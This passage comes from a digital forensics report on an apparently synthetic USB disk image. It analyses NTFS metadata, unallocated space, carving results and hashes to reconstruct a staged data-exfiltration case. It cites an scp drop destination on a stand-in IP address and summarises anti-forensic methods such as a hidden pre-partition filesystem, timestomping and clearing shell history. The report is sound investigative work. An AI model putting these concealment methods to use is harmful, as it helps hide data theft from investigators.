This artifact is the clearest single piece of cross-referencing evidence linking the two filesystems on the drive. Without it, the connection between the NTFS surface and the FAT12 partition would rest on contextual inference alone (the Project Alpha reference, the scripted creation patterns, the common Linux tooling). With it, the connection is explicit and documented in the suspect's own words.

### 5.5  Image Files — Absent Metadata

References: `evidence/ntfs/whiteboard_20240912.jpg`, `evidence/ntfs/office_floorplan.png`  
SHA-256 (jpg): `faaa88b92ededc2f67b7d38c135c8c79dac40ee4aee3876eb14f9a0f491bd8c0`  
SHA-256 (png): `0f85cd620da79ccf5f2f79c36777bf8ba2102494252c1304b85f674b9a688c97`

Both image files were examined with `exiftool` for embedded metadata. Neither contained EXIF data — no camera make or model, no GPS coordinates, no software identification, no original capture timestamps. The only date fields reported by `exiftool` were filesystem timestamps from the extraction process, not embedded image metadata.

For the PNG file (`office_floorplan.png`, 1200×900 pixels), the absence of EXIF is expected — the PNG specification does not natively support EXIF metadata, and most PNG-generating tools do not embed it.

For the JPEG file (`whiteboard_20240912.jpg`, 1920×1080 pixels), the absence is forensically significant. JPEG images captured by digital cameras or smartphones universally contain EXIF metadata: at minimum, the camera make and model, and typically dozens of additional fields including shutter speed, focal length, ISO, and often GPS coordinates. The filename `whiteboard_20240912` implies a photograph taken on September 12, 2024, yet the file contains no photographic metadata whatsoever. The JFIF header version is 1.01 with an aspect ratio density of 1×1 — a generic header that carries no provenance information.

This indicates one of two possibilities: the file was generated programmatically (e.g., as a synthetic image created by software rather than captured by a camera) and was never a photograph at all, or it was a genuine photograph from which all EXIF metadata was deliberately stripped. Either explanation is consistent with the broader pattern of manufactured evidence on this drive — files created to look plausible on casual inspection, but lacking the authentic provenance indicators that genuine files carry.

### 5.6  Remote Access Tools

References: `evidence/ntfs/putty.exe`, `evidence/ntfs/WinSCP-5.21.8-Setup.exe`  
SHA-256 (putty): `e61b8f44ab92cf0f9cb1101347967d31e1839979142a4114a7dd02aa237ba021`  
SHA-256 (WinSCP): `abf0bb2c73dea0b66de3f2fa34c03987980c3db4406f07c5f3b8c25dc6f5511f`

The Downloads directory contains two legitimate remote access utilities: PuTTY (an SSH terminal client, PE32+ 64-bit, 1,663,264 bytes) and WinSCP (an SCP/SFTP file transfer client, PE32 32-bit, 11,483,960 bytes). Both are well-known, widely used tools for secure remote access and file transfer.

Their presence on a drive that documents an `scp`-based exfiltration operation (§3.4, command 6) is contextually significant — the suspect placed the exact category of tools used in the exfiltration within the drive's visible file inventory. However, the probative value of the executables themselves is limited. PuTTY and WinSCP are standard IT tools with many legitimate uses; their mere presence does not establish wrongdoing. Their significance is contextual: they sit on a drive where every other artifact points to unauthorized data transfer, and they were placed there by the same scripted process that populated the rest of the manufactured NTFS surface.

As noted in §4.2, neither file carries a `Zone.Identifier` Alternate Data Stream, confirming they were not downloaded through a browser on this volume.

### 5.7  Document Content Analysis

The remaining OOXML files — `Q3_review.docx`, `team_contacts.xlsx`, and `meeting_notes.docx` — were unpacked and their internal XML examined for both document content and authoring metadata. Together with the `quarterly_report.pdf` analysis in §5.2, they reveal that every document on this drive was programmatically generated and that their contents repeatedly reference the same entities found in the hidden FAT12 evidence.

**meeting_notes.docx — The Operational Crossroads**

The internal `docProps/core.xml` is identical to `quarterly_report.pdf`'s: creator `python-docx`, description `generated by python-docx`, template timestamp `2013-12-23T23:15:00Z`, revision 1. Same toolchain, same operator.

The document body, however, is the most forensically significant file on the NTFS surface. Titled "Meeting Notes — Project Alpha — Status Review," it lists attendees as "J. Doe, S. Chen (Meridian FG), M. Patel" and contains the following action items and discussion points:

The document records that "all deliverables packaged and staged for transfer," directly paralleling the staging directory and archive creation documented in the `.bash_history` commands. An action item instructs the recipient to "confirm secure drop location with S. Chen before transfer" — language that maps directly to the `scp` destination `deploy@203.0.113.47:/var/drop/` recorded in command 6 of the bash history. A second action item, "verify integrity checksums prior to handoff," suggests a coordinated, prearranged data transfer protocol rather than an impulsive act. The document concludes by stating the "transfer to be completed before 2024-11-30" with "no further project meetings scheduled" — a planned final handoff.

The attendee "S. Chen (Meridian FG)" ties directly to `project_alpha.txt` in the encrypted archive, which identifies Meridian Financial Group as the client for a $2.4 million contract. The timestomping on this file (§5.3) now has clear motive: the suspect backdated the File Modified timestamp from March 16 to March 4 specifically to push this file — with its explicit references to the exfiltration logistics — outside a potential investigation window.

**Q3_review.docx — Internal Financial Data**

Internal metadata is again identical: `python-docx` creator, default template timestamps, revision 1. The document is titled "Q3 Financial Review — INTERNAL" and contains a financial summary table reporting actual revenue of $4.19M against projected $4.02M, along with expense and net income figures. Its action items section includes "Schedule client review calls — Project Alpha and Project Bravo." This is the third independent reference to Project Alpha across the drive (after `project_alpha.txt` in the encrypted archive and `meeting_notes.docx`), establishing that the NTFS surface documents were not randomly selected cover files but were thematically coordinated with the exfiltration payload.

**team_contacts.xlsx — A Different Tool, the Same Session**

Unlike the three Word documents, the spreadsheet's `docProps/core.xml` identifies its creator as `openpyxl` — a Python library for generating Excel files. Critically, `openpyxl` does not inject the 2013-era template timestamps that `python-docx` does. Its creation and modification timestamps read `2026-03-16T14:41:17Z` — the actual creation time: March 16, 2026 at 09:41 CDT. This independently corroborates the timeline established by the NTFS FN timestamps and the `quarterly_report.pdf` internal OOXML timestamps, all pointing to the same preparation session on March 16.

The spreadsheet contains a team directory with seven entries: Alice Monroe, Bob Tanner, Carol Zhang, David Park, Eva Rosen, Frank Osei, and Grace Thornton. All use `@corp.example` email addresses — the `.example` TLD is an IANA-reserved domain that cannot be registered, confirming these are fabricated identities. Each employee is assigned a department, phone extension, and manager. Notably, three Engineering employees report to "J. Doe," and Sales reports to "M. Patel" — both names appear as attendees in `meeting_notes.docx`. "J. Doe" is likely the suspect.

The seven employees in this spreadsheet correspond to the seven entries in `employee_list.csv` from the encrypted archive (§3.5). The NTFS surface file contains benign contact information (names, departments, extensions); the hidden FAT12 copy contains the same people's salaries and partial Social Security numbers. The suspect maintained two versions of the same roster — a sanitized one for the cover story and a sensitive one for the exfiltration payload.

### 5.8  Cluster Layout and Unallocated Gaps

The cluster allocation map for all user files, derived from the `istat` run-list data, reveals the physical distribution of data across the NTFS volume:

| Cluster Range   | File                          | Size        |
|-----------------|-------------------------------|-------------|
| 8,266–8,267     | team_contacts.xlsx            | 5,271 B     |
| 12,360–12,369   | Q3_review.docx                | 37,246 B    |
| 32,966–33,372   | putty.exe                     | 1,663,264 B |
| 37,056–39,859   | WinSCP-5.21.8-Setup.exe       | 11,483,960 B|
| 41,152–41,168   | whiteboard_20240912.jpg       | 67,387 B    |
| 45,248–45,252   | office_floorplan.png          | 18,091 B    |
| 49,344–49,353   | quarterly_report.pdf          | 36,891 B    |
| 53,440–53,449   | meeting_notes.docx            | 36,968 B    |

Substantial unallocated gaps exist between file runs — most notably, over 20,000 clusters (approximately 80 MiB) between Q3_review.docx (ending at cluster 12,369) and putty.exe (starting at cluster 32,966). These gaps, along with the eight orphan deleted files in MFT entries 16–23, suggest that additional files once occupied this volume and have since been removed. The unallocated space analysis in §6 examines these gaps for recoverable content.

---

## 6  NTFS Below the Surface

The previous section examined the files visible through the NTFS directory tree — entries the filesystem actively acknowledges, whether allocated or simply marked as deleted. This section goes deeper, examining three layers the filesystem no longer claims to know about: orphaned MFT entries whose parent directory references have been cleared, the full raw MFT structure including entries that no single tool exposes completely, the change journal status, and the raw content of every unallocated cluster on the volume.

The investigation in §5.8 identified eight orphan files and substantial unallocated gaps between file cluster allocations, raising the question of whether additional files once occupied this volume and were removed before the visible file population was written. The analysis below answers that question definitively.

### 6.1  Orphan File Analysis (MFT Entries 16–23)

The `fls` deleted-file listing identified eight entries under TSK's virtual `$OrphanFiles` directory:

```
-/r * 16:   $OrphanFiles/OrphanFile-16
-/r * 17:   $OrphanFiles/OrphanFile-17
-/r * 18:   $OrphanFiles/OrphanFile-18
-/r * 19:   $OrphanFiles/OrphanFile-19
-/r * 20:   $OrphanFiles/OrphanFile-20
-/r * 21:   $OrphanFiles/OrphanFile-21
-/r * 22:   $OrphanFiles/OrphanFile-22
-/r * 23:   $OrphanFiles/OrphanFile-23
```

TSK assigns files to `$OrphanFiles` when a deleted MFT entry's `$FILE_NAME` parent reference no longer resolves to a valid directory — the original path cannot be reconstructed. This represents a more thorough deletion than `readme.txt` (MFT 75), whose path was still recoverable from its intact `$FILE_NAME` parent pointer.

Each orphan was examined individually with `istat -o 2048 exhibit-a.dd <inode>`. All eight entries share identical characteristics:

| Field | Value (all eight entries) |
|-------|--------------------------|
| Status | Not Allocated File |
| Links | 0 |
| $LogFile Sequence Number | 0 |
| SI Flags | Hidden, System |
| SI Created | 2026-03-16 10:10:47.000 |
| SI File Modified | 2026-03-16 10:10:47.000 |
| SI MFT Modified | 2026-03-16 10:10:47.000 |
| SI Accessed | 2026-03-16 10:10:47.000 |
| Attributes present | `$STANDARD_INFORMATION` only (48 bytes, Resident) |

The critical observation is what these entries *lack*: none of them contains a `$FILE_NAME` attribute, a `$DATA` attribute, or any other attribute beyond `$STANDARD_INFORMATION`. There is no filename, no parent directory reference, no content, and no cluster allocation. These are not files from which data has been erased — they are entries that never held file data in the first place.

The sequence numbers confirm this interpretation. Each entry's sequence number matches its entry number: MFT 16 has Sequence 16, MFT 17 has Sequence 17, and so on through MFT 23 with Sequence 23. This is the signature of mkntfs initialization. When mkntfs formats a volume, it pre-allocates a block of MFT entries beyond the 16 reserved system slots, stamping each with a bare `$STANDARD_INFORMATION` attribute, Hidden+System flags, and an initialization sequence number equal to the entry number. A file that had been created, used, and then deleted would show Sequence 2 — allocated once at Sequence 1, then freed with an increment to Sequence 2 — exactly as `readme.txt` at MFT 75 does.

Recovery was attempted on all eight entries using `icat -o 2048 exhibit-a.dd <inode>`. All eight produced zero-byte output files, confirming the absence of any `$DATA` attribute. The empty recovery files are preserved in `evidence/ntfs/orphans/` for completeness.

**Conclusion:** MFT entries 16–23 are formatting artifacts created by mkntfs during volume initialization. They are pre-allocated empty slots that the filesystem prepared for future use but never assigned to actual files. They do not represent deleted user data, and no content is recoverable from them. The initial hypothesis from §5.8 — that these entries suggested additional files once occupied the volume — is not supported by the evidence.

### 6.2  Full MFT Structure

The raw `$MFT` file (MFT entry 0) was extracted using `icat -o 2048 exhibit-a.dd 0` and saved to `evidence/ntfs/mft.raw`. The file is 76,800 bytes — exactly 75 × 1,024-byte MFT entries plus the 1,024-byte entry for MFT 0 itself, giving entries 0 through 75. No MFT entries exist beyond entry 75. The MFT was sized precisely for the files this volume contains, with no additional entries lurking in higher slots.

The raw MFT was parsed into a structured CSV using `analyzeMFT` (output: `evidence/ntfs/mft.csv`). The tool produced 68 data rows — it omitted the eight unallocated entries (16–23), which is why manual `istat` examination was necessary to characterize those entries. No single tool provided complete MFT coverage; the combination of `fls`, `istat`, and `analyzeMFT` was required to account for every entry.

The full MFT structure breaks down as follows:

| Entry Range | Count | Contents |
|-------------|-------|----------|
| 0–11 | 12 | NTFS system metadata ($MFT, $MFTMirr, $LogFile, $Volume, $AttrDef, root directory, $Bitmap, $Boot, $BadClus, $Secure, $UpCase, $Extend) — all with timestamps of 2026-03-16 10:10:47 |
| 12–15 | 4 | Reserved NTFS slots — no filenames, formatting timestamp, sequence numbers matching entry numbers |
| 16–23 | 8 | Pre-allocated formatting artifacts — unallocated, analyzed in §6.1 |
| 24–26 | 3 | $Extend sub-entries ($Quota, $ObjId, $Reparse) — standard NTFS housekeeping structures |
| 27–63 | 37 | Zeroed MFT slots — completely empty entries with "Not defined" timestamps, Sequence 1, and no attributes; pre-allocated buffer between system and user entries that mkntfs never initialized beyond the minimal record structure |
| 64–66 | 3 | User directories (Documents, Downloads, Pictures) |
| 67–74 | 8 | User files (allocated) |
| 75 | 1 | Deleted user file (readme.txt) |

Two observations from the `analyzeMFT` CSV deserve note:

**The root directory (MFT entry 5) carries the latest SI Modification timestamp on the entire volume: 10:10:50.053.** This is the timestamp of the last metadata operation performed on the volume — later than even readme.txt's creation at 10:10:50.040. It corresponds to the directory index update triggered by the final file operation (the creation or deletion of readme.txt). This provides a definitive upper bound on when the volume was last written to.

**Entry 74 (meeting_notes.docx) is the only file exhibiting SI timestamp inversion when viewed across the full MFT.** In the `analyzeMFT` CSV, SI Creation reads `15:10:49.978Z` while SI Modification reads `22:42:00.015Z` on a date twelve days earlier (March 4 vs. March 16). Every other file on the volume shows SI Modification equal to or later than SI Creation. The anomaly is immediately visible in tabular cross-entry analysis — a capability that makes `analyzeMFT` a more effective timestomping detection tool than running `istat` on individual files, where the divergence must be noticed within a single entry's output rather than across entries.

### 6.3  Change Journal ($UsnJrnl) — Absent

The `$Extend` directory (MFT entry 11) was examined for the presence of the NTFS change journal:

```
fls -o 2048 exhibit-a.dd 11
r/r 25-144-2:   $ObjId:$O
r/r 24-144-3:   $Quota:$O
r/r 24-144-2:   $Quota:$Q
r/r 26-144-2:   $Reparse:$R
```

The `$Extend` directory contains only `$ObjId`, `$Quota`, and `$Reparse` — the standard housekeeping structures that mkntfs creates during formatting. **No `$UsnJrnl` entry exists.** There is no `$UsnJrnl:$J` (change records stream) and no `$UsnJrnl:$Max` (journal configuration stream).

The `$UsnJrnl` (Update Sequence Number Journal) is NTFS's filesystem-level audit trail. On a Windows system, it records every filesystem change event — file creation, deletion, rename, attribute modification, data write — as a sequential stream of timestamped records tagged with the affected file's MFT entry number and filename. It is the investigator's primary resource for reconstructing operational history when MFT entries have been reused or metadata has been altered.

Its absence here means there is no filesystem-level operational history for this volume. No creation events, no deletion events, no rename events — nothing. This is consistent with the volume having been created and populated entirely under ntfs-3g on Linux. The ntfs-3g driver does not implement the NTFS change journal; it reads and writes MFT entries and data clusters directly without generating journal records. On a volume that was formatted by Windows and later had its journal deleted, residual journal clusters might still be recoverable — but on a volume that was never touched by Windows, there is nothing to recover. The journal was never initialized.

In a different investigative scenario — a volume formatted by Windows, used over a period of time, and then presented with a missing journal — the absence of `$UsnJrnl` would be a strong indicator of deliberate anti-forensic interference (journal deletion to conceal file activity). On this volume, the simpler explanation applies: ntfs-3g never created it.

### 6.4  Unallocated Cluster Space — Entirely Null-Filled

The NTFS `$Bitmap` marks which clusters are allocated to files and which are free. The `blkls` utility extracts all unallocated clusters — every byte of storage that the filesystem does not currently assign to any file — into a single binary file for examination.

```
blkls -o 2048 exhibit-a.dd > evidence/ntfs/unallocated.bin
```

The output file is 241 MiB. Of the NTFS volume's approximately 255 MiB total capacity, only about 14 MiB is occupied by user file data and system metadata. The remaining 241 MiB is unallocated.

A `strings` search across the entire 241 MiB found **zero printable strings** — not a single sequence of four or more consecutive ASCII characters anywhere in the unallocated space. The file consists entirely of null bytes.

This result is forensically definitive. On a real USB drive — one that has been used, reformatted, or simply manufactured with a flash controller — unallocated space is never uniformly zeroed. It contains remnants of prior filesystems, fragments of deleted file content, partial directory entries, and ambient data from previous use. Even a freshly formatted real device retains flash-level artifacts from the manufacturing and testing process.

A uniformly zeroed 241 MiB unallocated region establishes that this image was constructed from a blank container — a zero-filled file created with a command like `dd if=/dev/zero of=exhibit-a.dd bs=1M count=256` or `truncate -s 256M exhibit-a.dd` — that was then partitioned, formatted with mkntfs, and populated with the scripted file set. The image does not originate from a physical USB device with any prior usage history. It is a synthetic artifact.

This also resolves the question raised in §5.8 regarding the large unallocated gaps between file cluster allocations. The 20,000+ cluster gap between Q3_review.docx (ending at cluster 12,369) and putty.exe (starting at cluster 32,966) is not evidence of removed files — it is empty space that was never occupied. The cluster allocations are sparse because ntfs-3g spread the files across the volume's address space, but the gaps between them contain only the null bytes that were present when the image file was created. No recoverable content exists in these gaps.

### 6.5  Synthesis: The Volume Is Fully Accounted For

Phase C examined every MFT entry, every byte of unallocated cluster space, and the full extent of the NTFS journal infrastructure. The results establish a complete accounting of the NTFS volume:

The MFT contains 76 entries (0–75). Twelve are active NTFS system metadata files. Four are reserved slots. Eight are pre-allocated formatting artifacts that never held user data. Three are `$Extend` sub-entries. Thirty-seven are zeroed empty slots. Three are user directories. Eight are allocated user files. One is a deleted user file whose content was fully recovered. No additional files — hidden, deleted, or otherwise — exist in the MFT.

The unallocated cluster space is uniformly zeroed. No remnant data, no carved file fragments, no residual content from prior use exists outside the allocated file regions. The filesystem change journal was never initialized, so no operational history is recorded at the filesystem level.

Combined with the findings from §4 and §5, this establishes that the NTFS volume contains exactly the artifacts documented in this report and nothing more. Every sector of the volume is accounted for: system metadata, user files, formatting artifacts, and null-filled free space. The hypothesis that the unallocated gaps and orphan entries suggested additional removed files (§5.8) is not supported — the volume was created clean and has held only the files documented here.

---

## 7  Stream-Level Analysis

The preceding sections examined the disk through its filesystem structures — partition tables, FAT12 metadata, NTFS MFT entries, and directory trees. This section applies a fundamentally different technique: stream scanning, which processes the raw byte stream of the entire disk image without regard to filesystem boundaries. The purpose is twofold: to detect artifacts that filesystem-aware tools cannot reach (compressed, encoded, or fragmented data within file containers), and to independently validate the filesystem-level findings.

### 7.1  bulk_extractor — Full Disk Scan

The `bulk_extractor` tool was run against the complete disk image with all default scanners enabled. bulk_extractor reads the image in overlapping 16 MiB pages, dispatches them to parallel scanner threads that apply pattern-matching rules for dozens of artifact categories, then sorts and deduplicates the results. Critically, it does not parse any filesystem metadata — it cannot tell whether a given byte offset falls within an allocated file, a deleted file, or unallocated space. That mapping must be performed by the examiner using the cluster allocation data from §5.8.

```
bulk_extractor -o be_output exhibit-a.dd
```

The scan completed in 12 seconds across four threads, processing all 268 MB at 22.31 MB/sec. The run log and provenance record (DFXML format) are preserved in `logs/bulk_extractor_run.txt` and `logs/be_report.xml`.

### 7.2  Feature File Results

bulk_extractor produced feature files across dozens of artifact categories. Each non-empty feature file is a three-column TSV: forensic path (byte offset plus any decompression chain), extracted feature, and surrounding context. The results fall into three categories: case-relevant hits, expected noise, and notable absences.

**Case-relevant findings:**

The domain feature file contains two entries originating from the FAT12 region (byte offsets 24,874 and 24,929, both within sectors 1–2,047). These are the IP address `192.168.1.0` (the nmap scan target from command 5 of the bash history) and `203.0.113.47` (the exfiltration destination from command 6). bulk_extractor recovered these from the raw byte stream without any knowledge of the hidden FAT12 filesystem — demonstrating that stream scanning can independently surface evidence that a partition-table-limited investigation would miss entirely.

**Expected noise — emails:**

The email feature file contains 31 entries, all false positives. Every hit is an SSH protocol identifier embedded within `putty.exe` — strings such as `hmac-sha2-256-etm@openssh.com` and `SSHCONNECTION@putty.projects.tartarus.org` that use the `@` character but are not human email addresses. These originate from byte offsets around 137 MB, which maps to PuTTY's cluster range (clusters 32,966–33,372 → absolute bytes ~135–137 MB). The email histogram confirms the pattern: all 31 entries resolve to SSH algorithm identifiers or PuTTY project addresses.

**Zero actual human email addresses exist on the entire disk.** The `team_contacts.xlsx` file contains seven `@corp.example` addresses, but bulk_extractor's scanner correctly rejects `.example` as an IANA-reserved TLD. This is itself forensically significant: the suspect used a reserved domain rather than a real corporate domain when fabricating the contact list, and the scanner's rejection of that domain independently confirms the fabricated nature of the data.

**Expected noise — URLs and domains:**

The URL and domain feature files are dominated by two categories of expected content. First, OOXML namespace URIs (`schemas.openxmlformats.org`, `schemas.microsoft.com`) extracted from the compressed XML inside the DOCX and XLSX files — bulk_extractor's recursive decompression (indicated by `-ZIP-` in the forensic paths) unpacked these from within the OOXML ZIP containers. Second, PKI infrastructure URLs (certificate revocation lists and OCSP responders from Sectigo, DigiCert, Comodo, and USERTrust) extracted from the code-signing certificates embedded in `putty.exe` and `WinSCP-5.21.8-Setup.exe`. The PuTTY homepage (`https://www.chiark.greenend.org.uk/~sgtatham/putty/`) and WinSCP documentation URL (`https://winscp.net/eng/docs/installation`) also appear in their respective certificates. These are legitimate software distribution URLs consistent with genuine, signed executables.

**Notable absences:**

The following feature files were entirely empty: credit card numbers (`ccn.txt`), telephone numbers (`telephone.txt`), IP addresses (`ip.txt`), GPS coordinates (`gps.txt`), HTTP server logs (`httplogs.txt`), Facebook artifacts (`facebook.txt`), JSON structures (`json.txt`), Windows Event Log entries (`evtx_carved.txt`), Windows link files (`winlnk.txt`), and Windows Prefetch records (`winprefetch.txt`). A genuine employee's working USB — one that had been used to transfer documents, browse cached web content, or interact with applications over weeks or months — would typically accumulate at least some of these artifact types. Their total absence across 256 MB of disk is consistent with a drive that was constructed in a single automated session and never used for organic work.

### 7.3  Carved Artifacts

bulk_extractor's MFT scanner carved two MFT-format structures from the raw byte stream. The first, at byte offset 1,064,960 (partition-relative cluster 2, exactly where `fsstat` reported the MFT), is 77,824 bytes — precisely 76 × 1,024-byte entries, independently confirming the MFT size established in §6.2. The second, at byte offset 134,737,920, is a 4,096-byte MFT mirror (`$MFTMirr`), containing copies of the first four MFT entries. Both are standard NTFS structures with no anomalies.

A single EXIF record was carved from byte offset 51,709,717 within a ZIP-decompressed stream. This is the `thumbnail.jpeg` embedded in the python-docx template used by `Q3_review.docx`. The EXIF data contains only resolution (72 DPI) and dimensions (395×512) — no camera metadata, no GPS data, no authoring information. No other EXIF-bearing images exist on the disk; in particular, `whiteboard_20240912.jpg` yielded no EXIF through stream scanning, confirming the metadata-stripped state noted in §5.5.

### 7.4  File Carving Cross-Check (foremost)

As an independent validation, the `foremost` file carver was run against the full disk image with all file types enabled. foremost uses header/footer signature matching to identify and extract recognizable file types from raw byte streams, regardless of filesystem state.

foremost carved nine files:

| File Offset | Type | Size | Identified Source |
|-------------|------|------|-------------------|
| 25,088 | zip | 1 KB | `secrets.zip` in FAT12 (sector 49) |
| 34,906,112 | zip | 5 KB | `team_contacts.xlsx` (OOXML/ZIP; MFT 67) |
| 51,675,136 | docx | 36 KB | `Q3_review.docx` (MFT 68) |
| 152,829,952 | exe | 844 KB | PE sub-executable within WinSCP installer |
| 153,594,296 | png | 29 KB | Icon resource within WinSCP installer |
| 169,607,168 | jpg | 65 KB | `whiteboard_20240912.jpg` (MFT 71) |
| 186,384,384 | png | 17 KB | `office_floorplan.png` (MFT 72) |
| 203,161,600 | docx | 36 KB | `quarterly_report.pdf` (MFT 73) |
| 219,938,816 | docx | 36 KB | `meeting_notes.docx` (MFT 74) |

Every carved file maps to a known evidence artifact. Notably, foremost identified `quarterly_report.pdf` as a `.docx` — because it carves by magic bytes, not filenames — independently confirming the extension mismatch documented in §5.2. No files were carved from unallocated space, independently confirming the null-filled state established in §6.4. foremost also successfully carved `secrets.zip` from the hidden FAT12 region at byte offset 25,088, demonstrating that header-footer carving can recover evidence from regions not described by the partition table.

The files that foremost did *not* carve are equally informative: `tools.txt`, `notes.txt`, and `.bash_history` are plain text files with no recognizable magic byte headers. Header-footer carving cannot recover unstructured text — only filesystem-aware tools or raw `strings` searches can find them. This is precisely why multiple analysis techniques are required: each finds what the others miss.

---

## 8  Evidence Integrity Verification

### 8.1  Disk Image Integrity

The disk image hashes were recomputed at the conclusion of all analysis. Both algorithms produced values identical to the pre-analysis baseline established in §2.1:

| Algorithm | Hash Value | Status |
|-----------|------------|--------|
| SHA-256   | `2a2c1f9afaa67085b265b2d0f8ee63eb129f75c1951c14aaaf72b4c1e987417a` | Match ✓ |
| MD5       | `c874892619978bded49f7ae997e3ec3e` | Match ✓ |

The image was not modified during the examination. All findings reported herein derive from an unaltered copy of the original exhibit.

### 8.2  Evidence File Manifest

All files extracted from the disk image during analysis are stored in the `evidence/` directory tree. Each file was hashed with SHA-256 at the time of extraction. A final comprehensive hash manifest was generated at the conclusion of the examination and is preserved in `logs/final_hash_manifest.txt`. The manifest contains 19 evidence files organized across three subdirectories:

**`evidence/fat12/` — Hidden FAT12 filesystem contents (5 files):**

| File | SHA-256 |
|------|---------|
| bash_history.txt | `8b7005cecca94994dabbba01e80b803bcc76d2a31f9982bd7a95faf17fa45ac0` |
| notes.txt | `5985dde5827bd830821e4b828d034b6f11b89f7f0b00e8c71b9d959b072f4510` |
| pre_partition.bin | `57c4543d8ae4ffc51c0643072ee8383d7c3e16cedfd71f7103eecfda689e86e7` |
| secrets.zip | `dad3fb51471623a51b6ba2b7544f7bb734b14cbbce543375a6e4f8c9b4f95913` |
| tools.txt | `69c92f60f74084239ac85a1fb132a82b5f27b8a4d44e4affc3f007e5f229e72c` |

**`evidence/secrets/` — Decrypted archive contents (3 files):**

| File | SHA-256 |
|------|---------|
| credentials.txt | `af42e7b412509bb0dc2ae99cee427463cbb01bad84fe6fa21ef10f6567a440f8` |
| employee_list.csv | `a45c344efaf8f3f847164daa9d299cb4dcfbf8af4cd211482a49c0d130d98fde` |
| project_alpha.txt | `18a915233ea9f959094c7df7c3eb806d2fd69c2686f7963442f833ac0d128930` |

**`evidence/ntfs/` — NTFS partition contents (11 files):**

| File | SHA-256 |
|------|---------|
| meeting_notes.docx | `0dd3d72fdc9ab8ec99d339525e26f0d49fc41af16fe66d5579f7ef3543ccf2c4` |
| mft.csv | `8d3ee5349e35be81c8992bdbb8ccdd2bf923c5c2c12bf5a8beaa126efc18b5b5` |
| mft.raw | `53256f7011d31454607046a20ada4d28763d3f46414586a486a605ff5e520a95` |
| office_floorplan.png | `0f85cd620da79ccf5f2f79c36777bf8ba2102494252c1304b85f674b9a688c97` |
| putty.exe | `e61b8f44ab92cf0f9cb1101347967d31e1839979142a4114a7dd02aa237ba021` |
| Q3_review.docx | `b8338f1605a4eda9ac444786e027e9931fdf4e5cdcf066a02cd1508af6b64548` |
| quarterly_report_actual.zip | `52ade68f1565c9c896d98b80b204207c014685bfb70c2440f2e61de54e58213c` |
| readme_deleted.txt | `9f7dee81f350ebc808e9ab391e061230a6654b04dfd6048428a53dbbacb26887` |
| team_contacts.xlsx | `bc8c3600cda84106613773b69eda1f77742964a8f8e728fa5ba5131299062ed9` |
| whiteboard_20240912.jpg | `faaa88b92ededc2f67b7d38c135c8c79dac40ee4aee3876eb14f9a0f491bd8c0` |
| WinSCP-5.21.8-Setup.exe | `abf0bb2c73dea0b66de3f2fa34c03987980c3db4406f07c5f3b8c25dc6f5511f` |

### 8.3  Tool Output Manifest

All tool outputs referenced in this report are stored in the `logs/` directory:

| File | Contents | Referenced in |
|------|----------|---------------|
| fls_full.txt | Complete recursive file listing of NTFS partition | §5.1 |
| deleted_files.txt | Deleted file listing from `fls -d` | §5.4, §6.1 |
| istat_all.txt | `istat` output for all user files (MFT 67–75) | §5.2–§5.8 |
| istat_orphans.txt | `istat` output for orphan entries (MFT 16–23) | §6.1 |
| hash_manifest.txt | Initial evidence file hashes | §2.1, §5.1 |
| final_hash_manifest.txt | Final comprehensive hash manifest | §8.2 |
| bulk_extractor_run.txt | bulk_extractor scan log | §7.1 |
| be_report.xml | bulk_extractor DFXML provenance record | §7.1 |
| email.txt | bulk_extractor email feature file | §7.2 |
| domain.txt | bulk_extractor domain feature file | §7.2 |
| url.txt | bulk_extractor URL feature file | §7.2 |
| email_histogram.txt | Email frequency histogram | §7.2 |
| domain_histogram.txt | Domain frequency histogram | §7.2 |
| exif.txt | EXIF metadata feature file | §7.3 |

---

## 9  Cross-Region Synthesis and Conclusions

### 9.1  The Drive as a Unified Artifact

The analysis of Exhibit A examined every sector of a 256 MiB disk image across three independent layers: raw byte stream, partition structure, and two separate filesystems. Each layer corroborated and extended the findings from the others. The sections below synthesize the key threads that span multiple regions.

### 9.2  Construction Method

The disk image was not acquired from a physical USB device. It was manufactured from a zero-filled container and populated programmatically in a single session on March 16, 2026, beginning at approximately 09:41 CDT (OOXML internal timestamps) and completing at 10:10:50 CDT (last MFT write). Five independent indicators support this conclusion:

The FAT12 unallocated space is entirely null-filled (§3.7). The NTFS unallocated space — 241 MB — is entirely null-filled (§6.4). The MFT contains only formatting artifacts and the exact set of files documented in this report, with no evidence of prior file creation or deletion cycles (§6.2). The NTFS `$LogFile` Sequence Number is zero on every MFT entry, ruling out any Windows NTFS driver interaction (§4.2). And the MBR boot code area beyond the first 80 bytes is zeroed (§2.3). On a real device with any usage history, at least one of these regions would contain non-zero residual data.

### 9.3  The Two-Layer Architecture

The drive's design separates incriminating operational evidence from a plausible cover story across two distinct concealment layers.

**Layer 1 — the NTFS surface** presents a routine work USB: three folders (Documents, Downloads, Pictures) containing office documents, software installers, and photographs labeled "WORK_USB." This layer is designed to satisfy casual inspection. Its contents are not random — the documents reference Project Alpha and the same employees found in the exfiltrated data — but viewed in isolation, they appear to be ordinary workplace files.

**Layer 2 — the hidden FAT12** contains the operational record: the offensive toolkit inventory, cracked organizational passwords, the complete command history of the exfiltration, and the encrypted data payload. This layer is invisible to any tool that relies on the partition table, and its contents are protected by encryption (the ZIP archive) and concealment (the pre-partition gap location).

The deleted `readme.txt` (§5.4) bridges these two layers. Its content — "archive is ready, key is safe" — is a cross-reference from the NTFS surface to the FAT12 evidence, written in the suspect's own words. The suspect deleted it to sever this connection, but the 30-byte resident data survived in the unallocated MFT entry.

### 9.4  Anti-Forensic Techniques Employed

The examination identified five distinct anti-forensic techniques, each defeated by a specific forensic method:

**Hidden filesystem placement.** The FAT12 was placed in the pre-partition gap, invisible to partition-table-aware tools. Defeated by whole-disk accounting via `mmls` and direct sector examination.

**File extension mismatch.** `quarterly_report.pdf` was a DOCX renamed to appear as a common PDF format. Defeated by magic byte comparison using the `file` utility, which reads file headers rather than trusting extensions.

**Timestamp manipulation.** The SI File Modified timestamp on `meeting_notes.docx` was backdated by twelve days. Defeated by SI/FN timestamp comparison — the `$FILE_NAME` attribute records the true creation time and cannot be altered through normal user-space operations.

**File deletion.** `readme.txt` was deleted to remove the cross-reference between the two filesystems. Defeated by resident-attribute recovery from the unallocated MFT entry, where the 30-byte content persisted within the 1,024-byte MFT record.

**History erasure.** The `history -c` command attempted to clear the bash command history. Defeated by the fact that the `.bash_history` file had already been written to FAT12 storage before the in-memory buffer was cleared.

Each technique represented a genuine forensic challenge. None was a trivial mistake — the hidden filesystem placement, in particular, would defeat any investigation that confined itself to the partition table. The techniques failed not because they were poorly executed, but because forensic examination of the entire disk systematically addresses each concealment vector.

### 9.5  The Entity Network

